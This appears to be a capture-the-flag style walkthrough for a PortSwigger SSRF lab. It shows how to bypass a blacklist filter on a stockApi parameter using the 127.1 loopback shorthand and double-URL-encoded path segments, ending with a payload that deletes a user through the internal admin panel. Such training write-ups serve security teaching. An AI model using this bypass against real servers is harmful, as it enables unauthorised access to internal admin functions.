# Lab-4: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

This lab has a stock check feature which fetches data from an internal system. 

**Aim :-** To solve the lab, change the stock check URL to access the admin interface at ``` http://localhost/admin ``` and delete the user ``` carlos ```.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 



## Solution
- Intercept a **Check stock** request using **burp suite** and send it to **repeater**.

- Change the ``` stockApi= ``` value to ``` http://127.0.0.1/admin ``` and forward the request.

- The server respond with ``` External stock check blocked for security reasons ``` error message.

- Change the ``` stockApi= ``` value to ``` http://127.1/ ``` and go to **decoder** tab in **burp suite**.

- Double **URL Encode** the value ``` admin ```.

- Copy the **Encoded** value paste it in the end of the ``` http://127.1/ ``` .

- Forward the request.

- From the response admin dashboard source code find the endpoint to delete user ``` carlos ```.

- Paste the **URL** in ``` stockApi ``` **(** stockApi will look like : ``` http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos ``` **)** and forward the request.